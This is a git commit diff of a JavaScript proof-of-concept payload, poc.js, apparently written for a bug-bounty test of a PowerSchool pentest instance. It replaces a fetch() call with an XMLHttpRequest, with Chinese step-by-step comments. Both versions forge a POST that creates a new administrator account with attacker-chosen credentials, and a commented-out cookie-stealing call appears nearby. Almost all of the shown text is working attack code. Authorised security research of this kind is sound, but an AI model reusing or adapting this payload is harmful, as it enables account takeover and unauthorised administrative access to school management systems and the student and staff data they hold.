a1d1945f44e263264a899843f20e538750b7eb51
johnstonemees <51981550@qq.com>
2024-09-19 13:40:07 +0800

    Update poc.js

--- js/poc.js
+++ js/poc.js
@@ -19,24 +19,8 @@ function getCookie(cname)
 //stealCookies();
 
 // add new administrator account
-fetch("https://pentest.sfe.powerschool.com/profileMainAction.do", {
-  "headers": {
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
-    "cache-control": "no-cache",
-    "content-type": "application/x-www-form-urlencoded",
-    "pragma": "no-cache",
-    "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": "\"Windows\"",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-user": "?1",
-    "upgrade-insecure-requests": "1"
-  },
-  "referrer": "https://pentest.sfe.powerschool.com/profileMainAction.do",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "employeeSearchId=&accessIdStr=9997&webPassword=Attacker%40powerschool.com&lastName=attacker&firstName=John&email=esperamier%2Battacker%40bugcrowdninja.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=02126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=100314&genderCd=0&ethnicityCd=0&languageId=1&enableTimeKeeping=on&roleAdm=on&activeAdm=on&roleEmp=on&activeEmp=on&calendarId=1&disableJobShopping=false&callBackNumber=&submitInsert=Save",
-  "method": "POST"
-});
+var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
+httpRequest.open('POST', 'https://pentest.sfe.powerschool.com/profileMainAction.do', true); //第二步：打开连接
+httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头(在建立连接后设置请求头)
+httpRequest.send('employeeSearchId=&accessIdStr=9998&webPassword=Attacker%40powerschool.com&lastName=Stone&firstName=John&email=johnstone%40wearehackerone.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=2126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=10031&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&activeAdm=on&calendarId=-99&disableJobShopping=false&callBackNumber=&submitInsert=Save');//发送请求 将情头体写在send中
+
